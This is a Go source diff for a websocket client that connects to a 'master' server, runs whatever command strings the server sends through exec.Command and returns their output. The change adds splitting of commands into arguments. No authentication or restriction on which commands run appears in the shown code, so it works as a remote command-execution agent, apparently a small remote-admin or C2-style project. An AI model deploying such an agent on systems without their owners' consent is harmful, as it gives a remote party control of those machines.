@@ -4,6 +4,7 @@ import (
 	"fmt"
 	"log"
 	"os/exec"
+	"strings"
 	"time"
 
 	"github.com/gorilla/websocket"
@@ -16,6 +17,7 @@ type client struct {
 }
 
 func (c *client) connectToServer(host string, port int) {
+
 	masterURL := fmt.Sprintf("ws://%s:%d/ws", host, port)
 	connection, _, err := websocket.DefaultDialer.Dial(masterURL, nil)
 	if err != nil {
@@ -27,16 +29,31 @@ func (c *client) connectToServer(host string, port int) {
 
 }
 
-func (c *client) runShellCommand(command []byte) []byte {
+func formatCommand(command []byte) (string, []string) {
 	stringCommand := string(command)
-	log.Printf("Running %s command\n", stringCommand)
-	output, err := exec.Command(stringCommand).Output()
+	splittedCommands := strings.Split(stringCommand, " ")
+	var firstCommand string
+	var arguments []string
+	firstCommand = splittedCommands[0]
+
+	if len(splittedCommands) > 1 {
+		arguments = splittedCommands[1:]
+	}
+
+	return firstCommand, arguments
+}
+
+func (c *client) runShellCommand(instructions []byte) []byte {
+	command, arguments := formatCommand(instructions)
+
+	log.Printf("Running %s %+v command\n", command, arguments)
+
+	output, err := exec.Command(command, arguments...).Output()
 	if err != nil {
 		log.Printf("Error running command: %s\n", err)
 	}
 	fmt.Println(string(output))
 	return output
-	// Send the newly received message to the broadcast channel
 }
 
 func main() {
@@ -54,7 +71,6 @@ func main() {
 				fmt.Printf("Could not write message %s to ws %s\n", string(commandOutput), err)
 			}
 		}
-
 		time.Sleep(time.Second * 1)
 	}
 }
